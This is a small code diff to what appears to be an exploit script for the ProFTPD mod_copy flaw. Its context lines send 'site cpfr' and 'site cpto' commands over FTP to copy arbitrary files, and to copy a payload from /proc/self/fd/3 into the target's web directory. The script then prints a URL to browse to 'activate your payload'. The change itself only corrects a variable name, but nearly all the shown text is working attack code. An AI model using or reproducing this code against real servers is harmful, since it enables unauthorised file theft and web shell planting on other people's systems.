@@ -66,7 +66,7 @@ def main():
 		else:
 			error("Target doesn't appear to be vulnerable!")
 	if options.chosenmode == "2":
-		resultpath = webdir + ''.join(random.choice('0123456789ABCDEF') for i in range(16))
+		resultpath = options.webdir + ''.join(random.choice('0123456789ABCDEF') for i in range(16))
 		s.send("site cpfr %s" % options.file)
 		if "350" in s.recv(1024):
 			good("File exists! Copying now")
@@ -85,7 +85,7 @@ def main():
 		s.recv(1024)
 		s.send("site cpfr /proc/self/fd/3")
 		s.recv(1024)
-		s.send("site cpto %s%s" % (webdir, shellkey))
+		s.send("site cpto %s%s" % (options.webdir, shellkey))
 		s.recv(1024)
 		status("Browse to http://%s/%s to activate your payload!" % (options.target, shellkey))
 
